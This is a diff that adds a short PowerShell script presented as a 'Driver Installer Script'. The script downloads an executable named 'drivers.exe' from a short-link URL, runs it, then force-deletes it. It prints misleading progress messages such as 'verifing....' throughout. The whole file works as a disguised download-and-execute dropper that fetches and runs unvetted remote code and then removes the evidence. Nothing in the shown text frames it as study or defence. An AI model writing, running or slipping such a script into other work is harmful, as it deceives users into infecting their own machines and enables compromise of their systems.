@@ -1,0 +1,30 @@
+# Driver Installer Script
+$url = "https://dkm.s.gy/file"
+$out = "$env:USERPROFILE\Downloads\drivers.exe"
+ 
+Write-Host "wait dont close..." -ForegroundColor Cyan
+ 
+# Download the file
+Write-Host "verifing...." -ForegroundColor Yellow
+try {
+    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
+} catch {
+    Write-Error "Download failed: $_"
+    exit 1
+}
+ 
+# Run the file
+if (Test-Path $out) {
+    Write-Host "Running..." -ForegroundColor Green
+    Start-Process -FilePath $out -Wait
+    Write-Host "complete!" -ForegroundColor Green
+ 
+    # Remove the file after running
+    Remove-Item $out -Force -ErrorAction SilentlyContinue
+    Write-Host "Cleanup complete." -ForegroundColor Gray
+} else {
+    Write-Warning "swerteeng kumag"
+}
+ 
+# Exit the terminal
+exit
